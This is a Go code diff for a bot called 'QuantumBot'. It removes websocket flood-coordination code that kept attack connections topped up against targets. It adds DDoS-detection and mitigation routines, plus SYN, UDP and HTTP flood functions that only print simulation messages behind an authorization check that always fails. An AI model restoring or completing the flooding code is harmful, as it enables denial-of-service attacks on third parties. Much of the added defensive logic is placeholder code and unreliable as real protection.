-	// Optimize bandwidth usage patterns
-	fmt.Println("🔧 Optimizing bandwidth usage patterns")
-}
-
-// 🔧 FLOOD COORDINATION
-func (qb *QuantumBot) floodCoordinator() {
+func (qb *QuantumBot) threatDetectionWorker() {
 	ticker := time.NewTicker(5 * time.Second)
 	defer ticker.Stop()
 	
 	for range ticker.C {
-		qb.coordinateFloodAttacks()
-		qb.cleanupDeadConnections()
+		qb.performThreatDetection()
 	}
 }
 
-func (qb *QuantumBot) coordinateFloodAttacks() {
-	// Coordinate flood attacks across different targets
-	if atomic.LoadInt32(&qb.networkFlooder.isActive) == 0 {
+func (qb *QuantumBot) performThreatDetection() {
+	if !qb.ddosProtection.enabled {
 		return
 	}
 	
-	qb.networkFlooder.mutex.RLock()
-	activeConnections := len(qb.networkFlooder.floodConnections)
-	qb.networkFlooder.mutex.RUnlock()
+	// Analyze traffic patterns
+	qb.analyzeTrafficPatterns()
 	
-	targetConnections := qb.calculateOptimalFloodSize()
+	// Check for known attack signatures
+	qb.checkAttackSignatures()
 	
-	if activeConnections < targetConnections {
-		deficit := targetConnections - activeConnections
-		go qb.createAdditionalFloodConnections(deficit)
+	// Apply mitigation strategies
+	qb.applyMitigationStrategies()
+}
+
+func (qb *QuantumBot) analyzeTrafficPatterns() {
+	// Analyze current traffic against baseline
+	stats := qb.trafficAnalyzer.realTimeStats
+	baseline := qb.trafficAnalyzer.baselineTraffic
+	
+	// Check for volume anomalies
+	if stats.bytesPerSecond > baseline.normalVolume*2 {
+		qb.reportAnomaly("High traffic volume", SeverityHigh)
+	}
+	
+	// Check for rate anomalies
+	if stats.packetsPerSecond > int64(baseline.normalRate*3) {
+		qb.reportAnomaly("High packet rate", SeverityMedium)
+	}
+	
+	// Check for connection anomalies
+	if stats.connections > 10000 {
+		qb.reportAnomaly("Excessive connections", SeverityCritical)
 	}
 }
 
-func (qb *QuantumBot) cleanupDeadConnections() {
-	qb.networkFlooder.mutex.Lock()
-	defer qb.networkFlooder.mutex.Unlock()
+func (qb *QuantumBot) reportAnomaly(description string, severity ThreatSeverity) {
+	anomaly := TrafficAnomaly{
+		id:          fmt.Sprintf("anomaly_%d", time.Now().Unix()),
+		description: description,
+		severity:    severity,
+		timestamp:   time.Now(),
+		resolved:    false,
+	}
 	
-	activeConnections := make([]*websocket.Conn, 0, len(qb.networkFlooder.floodConnections))
+	qb.trafficAnalyzer.anomalies = append(qb.trafficAnalyzer.anomalies, anomaly)
 	
-	for _, conn := range qb.networkFlooder.floodConnections {
-		if conn != nil {
-			// Test connection health
-			err := conn.WriteMessage(websocket.PingMessage, []byte("health-check"))
-			if err == nil {
-				activeConnections = append(activeConnections, conn)
-			} else {
-				conn.Close()
+	fmt.Printf("⚔️ Traffic anomaly detected: %s (Severity: %d)\n", description, severity)
+}
+
+func (qb *QuantumBot) checkAttackSignatures() {
+	// Check for known attack patterns
+	engine := qb.ddosProtection.detectionEngine
+	
+	for _, pattern := range engine.patterns {
+		confidence := qb.calculatePatternConfidence(pattern)
+		
+		if confidence > engine.thresholds[pattern.name] {
+			qb.reportThreat(pattern, confidence)
+		}
+	}
+}
+
+func (qb *QuantumBot) calculatePatternConfidence(pattern AttackPattern) float64 {
+	// Simplified pattern matching
+	// In a real implementation, this would analyze network packets
+	
+	baseConfidence := pattern.confidence
+	
+	// Adjust based on current traffic anomalies
+	if len(qb.trafficAnalyzer.anomalies) > 0 {
+		baseConfidence += 0.1
+	}
+	
+	return baseConfidence
+}
+
+func (qb *QuantumBot) reportThreat(pattern AttackPattern, confidence float64) {
+	threat := DetectedThreat{
+		id:        fmt.Sprintf("threat_%d", time.Now().Unix()),
+		pattern:   pattern,
+		source:    "unknown", // Would be determined from packet analysis
+		timestamp: time.Now(),
+		mitigated: false,
+		severity:  pattern.severity,
+	}
+	
+	qb.ddosProtection.detectionEngine.activeThreats = append(
+		qb.ddosProtection.detectionEngine.activeThreats,
+		threat,
+	)
+	
+	fmt.Printf("⚔️ Threat detected: %s (Confidence: %.2f)\n", pattern.name, confidence)
+}
+
+func (qb *QuantumBot) applyMitigationStrategies() {
+	mitigation := qb.ddosProtection.mitigation
+	
+	// Check active threats for mitigation
+	for i := range qb.ddosProtection.detectionEngine.activeThreats {
+		threat := &qb.ddosProtection.detectionEngine.activeThreats[i]
+		
+		if !threat.mitigated {
+			// Find appropriate strategy
+			strategy := qb.findMitigationStrategy(threat.severity)
+			if strategy != nil {
+				qb.executeMitigation(threat, *strategy)
+				threat.mitigated = true
 			}
 		}
 	}
 	
-	cleaned := len(qb.networkFlooder.floodConnections) - len(activeConnections)
-	qb.networkFlooder.floodConnections = activeConnections
+	// Clean up expired blocks
+	qb.cleanupExpiredBlocks(mitigation)
+}
+
+func (qb *QuantumBot) findMitigationStrategy(severity ThreatSeverity) *MitigationStrategy {
+	for _, strategy := range qb.ddosProtection.mitigation.strategies {
+		if strategy.trigger <= severity && strategy.automated {
+			return &strategy
+		}
+	}
+	return nil
+}
+
+func (qb *QuantumBot) executeMitigation(threat *DetectedThreat, strategy MitigationStrategy) {
+	fmt.Printf("⚔️ Executing mitigation: %s for threat %s\n", strategy.name, threat.pattern.name)
 	
-	if cleaned > 0 {
-		fmt.Printf("🧹 Cleaned up %d dead flood connections\n", cleaned)
+	switch strategy.action {
+	case ActionBlock:
+		qb.blockThreatSource(threat, strategy.duration)
+	case ActionRateLimit:
+		qb.rateLimitThreatSource(threat, strategy.duration)
+	case ActionDrop:
+		qb.dropThreatTraffic(threat)
+	}
+}
+
+func (qb *QuantumBot) blockThreatSource(threat *DetectedThreat, duration time.Duration) {
+	block := ActiveBlock{
+		ip:        threat.source,
+		reason:    fmt.Sprintf("Threat: %s", threat.pattern.name),
+		timestamp: time.Now(),
+		duration:  duration,
+		automatic: true,
+	}
+	
+	qb.ddosProtection.mitigation.activeBlocks = append(
+		qb.ddosProtection.mitigation.activeBlocks,
+		block,
+	)
+	
+	fmt.Printf("⚔️ Blocked IP: %s for %v\n", threat.source, duration)
+}
+
+func (qb *QuantumBot) rateLimitThreatSource(threat *DetectedThreat, duration time.Duration) {
+	rateLimit := &RateLimit{
+		requests:  10, // Allow only 10 requests
+		window:    1 * time.Minute,
+		lastReset: time.Now(),
+	}
+	
+	qb.ddosProtection.mitigation.rateLimits[threat.source] = rateLimit
+	
+	fmt.Printf("⚔️ Rate limited IP: %s\n", threat.source)
+}
+
+func (qb *QuantumBot) dropThreatTraffic(threat *DetectedThreat) {
+	fmt.Printf("⚔️ Dropping traffic from threat: %s\n", threat.pattern.name)
+}
+
+func (qb *QuantumBot) cleanupExpiredBlocks(mitigation *MitigationEngine) {
+	activeBlocks := make([]ActiveBlock, 0)
+	
+	for _, block := range mitigation.activeBlocks {
+		if time.Since(block.timestamp) < block.duration {
+			activeBlocks = append(activeBlocks, block)
+		} else {
+			fmt.Printf("⚔️ Expired block removed: %s\n", block.ip)
+		}
+	}
+	
+	mitigation.activeBlocks = activeBlocks
+}
+
+func (qb *QuantumBot) trafficAnalysisWorker() {
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+	
+	for range ticker.C {
+		qb.performTrafficAnalysis()
+	}
+}
+
+func (qb *QuantumBot) performTrafficAnalysis() {
+	// Update baseline traffic patterns
+	qb.updateTrafficBaseline()
+	
+	// Detect traffic anomalies
+	qb.detectTrafficAnomalies()
+	
+	// Update traffic patterns
+	qb.updateTrafficPatterns()
+}
+
+func (qb *QuantumBot) updateTrafficBaseline() {
+	baseline := qb.trafficAnalyzer.baselineTraffic
+	stats := qb.trafficAnalyzer.realTimeStats
+	
+	// Update baseline with moving average
+	alpha := 0.1 // Learning rate
+	baseline.normalVolume = int64(float64(baseline.normalVolume)*(1-alpha) + float64(stats.bytesPerSecond)*alpha)
+	baseline.normalRate = baseline.normalRate*(1-alpha) + float64(stats.packetsPerSecond)*alpha
+	
+	baseline.established = time.Now()
+}
+
+func (qb *QuantumBot) detectTrafficAnomalies() {
+	// This method is called from analyzeTrafficPatterns()
+	// Additional anomaly detection logic can be added here
+	
+	// Check for protocol anomalies
+	qb.checkProtocolAnomalies()
+	
+	// Check for timing anomalies
+	qb.checkTimingAnomalies()
+}
+
+func (qb *QuantumBot) checkProtocolAnomalies() {
+	// Check for unusual protocol distributions
+	// This would require actual packet capture and analysis
+	
+	fmt.Println("⚔️ Checking protocol anomalies...")
+}
+
+func (qb *QuantumBot) checkTimingAnomalies() {
+	// Check for unusual timing patterns
+	// This would analyze packet timing distributions
+	
+	fmt.Println("⚔️ Checking timing anomalies...")
+}
+
+func (qb *QuantumBot) updateTrafficPatterns() {
+	// Learn normal traffic patterns over time
+	currentHour := time.Now().Hour()
+	
+	// Update peak hours based on current traffic
+	stats := qb.trafficAnalyzer.realTimeStats
+	baseline := qb.trafficAnalyzer.baselineTraffic
+	
+	if stats.bytesPerSecond > baseline.normalVolume {
+		// This is a peak hour
+		qb.addPeakHour(currentHour)
+	}
+}
+
+func (qb *QuantumBot) addPeakHour(hour int) {
+	baseline := qb.trafficAnalyzer.baselineTraffic
+	
+	// Add hour to peak hours if not already present
+	for _, peakHour := range baseline.peakHours {
+		if peakHour == hour {
+			return // Already a peak hour
+		}
+	}
+	
+	baseline.peakHours = append(baseline.peakHours, hour)
+	fmt.Printf("⚔️ Added peak hour: %d\n", hour)
+}
+
+// NETWORK WARFARE ATTACK METHODS
+func (qb *QuantumBot) launchNetworkAttack(target string, attackType FloodType, intensity float64) {
+	if !qb.isAttackAuthorized() {
+		fmt.Println("⚔️ Attack not authorized - educational purposes only")
+		return
+	}
+	
+	qb.networkFlooder.targetAddr = target
+	qb.networkFlooder.floodType = attackType
+	qb.networkFlooder.intensity = intensity
+	
+	switch attackType {
+	case FloodSYN:
+		qb.launchSYNFlood(target, intensity)
+	case FloodUDP:
+		qb.launchUDPFlood(target, intensity)
+	case FloodHTTP:
+		qb.launchHTTPFlood(target, intensity)
+	}
+}
+
+func (qb *QuantumBot) isAttackAuthorized() bool {
+	// In a real implementation, this would check authorization
+	// For educational/testing purposes only
+	return false
+}
+
+func (qb *QuantumBot) launchSYNFlood(target string, intensity float64) {
+	fmt.Printf("⚔️ [SIMULATION] SYN flood attack on %s with intensity %.2f\n", target, intensity)
+	
+	// This is a simulation - real implementation would be for educational purposes only
+	flowCount := int(intensity * float64(qb.networkFlooder.maxConnections))
+	
+	for i := 0; i < flowCount; i++ {
+		flow := FloodFlow{
+			id:        i,
+			startTime: time.Now(),
+			active:    true,
+		}
+		
+		qb.networkFlooder.activeFlows = append(qb.networkFlooder.activeFlows, flow)
+	}
+}
+
+func (qb *QuantumBot) launchUDPFlood(target string, intensity float64) {
+	fmt.Printf("⚔️ [SIMULATION] UDP flood attack on %s with intensity %.2f\n", target, intensity)
+	
+	// Educational simulation only
+}
+
+func (qb *QuantumBot) launchHTTPFlood(target string, intensity float64) {
+	fmt.Printf("⚔️ [SIMULATION] HTTP flood attack on %s with intensity %.2f\n", target, intensity)
+	
+	// Educational simulation only
+}
+
+// DEFENSIVE METHODS
+func (qb *QuantumBot) enableDefensiveMode() {
+	qb.ddosProtection.enabled = true
+	
+	fmt.Println("⚔️ Defensive mode enabled")
+	fmt.Println("   - DDoS protection: ACTIVE")
+	fmt.Println("   - Threat detection: RUNNING")
+	fmt.Println("   - Traffic analysis: MONITORING")
+}
+
+func (qb *QuantumBot) disableDefensiveMode() {
+	qb.ddosProtection.enabled = false
+	
+	fmt.Println("⚔️ Defensive mode disabled")
+}
+
+func (qb *QuantumBot) getNetworkWarfareStatus() map[string]interface{} {
+	return map[string]interface{}{
+		"flooder": map[string]interface{}{
+			"active_flows":   len(qb.networkFlooder.activeFlows),
+			"max_connections": qb.networkFlooder.maxConnections,
+			"current_target": qb.networkFlooder.targetAddr,
+			"intensity":      qb.networkFlooder.intensity,
+		},
+		"protection": map[string]interface{}{
+			"enabled":        qb.ddosProtection.enabled,
+			"active_threats": len(qb.ddosProtection.detectionEngine.activeThreats),
+			"active_blocks":  len(qb.ddosProtection.mitigation.activeBlocks),
+			"rate_limits":    len(qb.ddosProtection.mitigation.rateLimits),
+		},
+		"traffic": map[string]interface{}{
+			"packets_per_sec": qb.trafficAnalyzer.realTimeStats.packetsPerSecond,
+			"bytes_per_sec":   qb.trafficAnalyzer.realTimeStats.bytesPerSecond,
+			"connections":     qb.trafficAnalyzer.realTimeStats.connections,
+			"anomalies":       len(qb.trafficAnalyzer.anomalies),
+		},
 	}
 }
